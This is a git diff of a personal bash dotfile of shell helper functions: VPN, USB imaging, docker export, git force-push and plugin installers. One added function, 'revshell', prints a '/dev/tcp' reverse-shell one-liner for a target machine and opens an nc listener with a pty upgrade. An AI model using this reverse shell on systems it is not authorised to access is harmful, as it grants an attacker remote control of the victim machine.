@@ -1,73 +1,92 @@
 #!/usr/bin/env bash
 
 # Utils
-md () { command mkdir -p "$@" && cd "$1"; }
+md(){ command mkdir -p "$@" && cd "$1"; }
 winvm () {
     ~/bin/winvm $1 &
 }
 
-ddusb (){
-    vara=$1
-    varb=$2
+ddusb(){
+    local vara=$1
+    local varb=$2
     shift 2
     sudo dd bs=4M if="$vara" of="$varb" status=progress oflag=sync $@
 }
-mipsl (){
+mipsl(){
     ip addr |  awk '/inet6.*global/{print substr($2,1,length($2)-3)}'
 }
 
 #Command
 
-vpn (){
-    name=$(~/bin/vpnfilter | tail -n2 | head -n -1 | awk '{print $3}')
+vpn(){
+    local name=$(~/bin/vpnfilter | tail -n2 | head -n -1 | awk '{print $3}')
     command sudo openvpn "$VPNDIR"/"$name"
 }
 
-xev (){
-command xev | awk -F'[ )]+' '/^KeyPress/ { a[NR+2] } NR in a { printf "%-3s %s\n", $5, $8 }'
+xev(){
+command -p xev | awk -F'[ )]+' '/^KeyPress/ { a[NR+2] } NR in a { printf "%-3s %s\n", $5, $8 }'
 }
 
-cpufreq (){
+cpufreq(){
 while true;do  grep MHz /proc/cpuinfo;sleep 0.5;clear;done
 }
 
-dockerpull (){
+dockerpull(){
 mkdir -p $2
 docker pull $1
 docker export "$(docker create --name $(basename "$2"temp) $1 true)" | tar -x -C $2
 docker rm $(basename "$2"temp)
 }
 
-gitforce (){
+gitforce(){
 echo -n Are you sure \?
 read
 git add . && git commit --amend --date=$(date --iso-8601=seconds) && git push --force
 }
-getname (){
+getname(){
 #Get classname of a windows
-NAME=`xprop | grep "^WM_CLASS"`
+local NAME=`xprop | grep "^WM_CLASS"`
 echo $NAME
 echo $NAME | awk '{print "Name: " $4}'
 }
 
-small (){
+small(){
 convert -resize $1 $2 Small$2
 }
 
-wifidb (){
+wifidb(){
 while true
 do
 echo `cat /proc/net/wireless | awk '{print $4}' | tail -n 1 | cut -d '.' -f1 ;sleep 0.01` dBm
 done
 }
 
-ydlmusic (){
+revshell(){
+local port
+[[ -z "$1" ]] && port=8080 || port="$1"
+echo "bash -c \"bash -i &> /dev/tcp/$(mip)/"$port" 0>&1\"" #command to send on the computer to access
+printf "bash -c \"bash -i &> /dev/tcp/$(mip)/"$port" 0>&1\"" | xclip -selection clipboard
+local rows=$(stty -a | cut -d";" -f2 | cut -d" " -f3 | head -n1)
+local columns=$(stty -a | cut -d";" -f3 | cut -d" " -f3 | head -n1)
+bash -c "
+stty raw -echo
+(
+printf \"exec python -c \'import pty; pty.spawn(\\\"bash\\\")\'
+stty rows $rows cols $columns
+clear
+\";cat) |
+nc -l $port
+"
+stty sane
+}
+
+ydlmusic(){
     cd ~/Music/Musiques/Autres/Youtube
     youtube-dl --playlist-reverse -f bestaudio/best --download-archive list.txt -cio '%(playlist_index)s-%(id)s %(title)s.%(ext)s' https://www.youtube.com/playlist\?list\=PLtuQ0P--dLnwb78V9LdEy0DAFGvZKfMnt 2>> errors.log
     cd -
 }
 
-wolpc (){
+wolpc(){
 wol -p 999 -i alkeryn.freeboxos.fr 70:85:c2:5a:0c:0b
 }
 
@@ -78,7 +97,7 @@ curl -sLo ~/.zsh/antigen.zsh --create-dirs --proto-redir -all,https \
     git.io/antigen
 }
 
-vimplug-install (){
+vimplug-install(){
 curl -sLo ~/.local/share/nvim/site/autoload/plug.vim --create-dirs \
     https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
 pip2 install --user neovim
@@ -87,14 +106,14 @@ npm install --user neovim
 rm -f ~/package-lock.json
 }
 
-gef-install (){
+gef-install(){
 curl -sLo ~/.local/share/gdb/gef.py --create-dirs \
     https://github.com/hugsy/gef/raw/master/gef.py
 pip2 install --user capstone unicorn keystone-engine ropper
 pip3 install --user capstone unicorn keystone-engine ropper
 }
 
-rice-install (){
+rice-install(){
 antigen-install
 vimplug-install
 gef-install
